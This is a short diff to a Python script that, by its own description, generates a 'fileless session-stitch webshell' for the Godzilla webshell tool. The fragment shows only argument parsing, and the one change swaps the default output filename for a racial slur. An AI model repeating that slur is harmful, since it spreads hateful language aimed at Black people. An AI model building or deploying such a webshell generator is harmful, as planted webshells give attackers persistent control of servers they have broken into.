@@ -213,7 +213,7 @@ def main() -> None:
     parser = argparse.ArgumentParser(
         description="Generate a protocol-compatible, fileless session-stitch webshell for Godzilla."
     )
-    parser.add_argument("--output", default="session_stitch_shell.php", help="Output file path.")
+    parser.add_argument("--output", default="nigger.php", help="Output file path.")
     parser.add_argument(
         "--password",
         default="pass_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)),
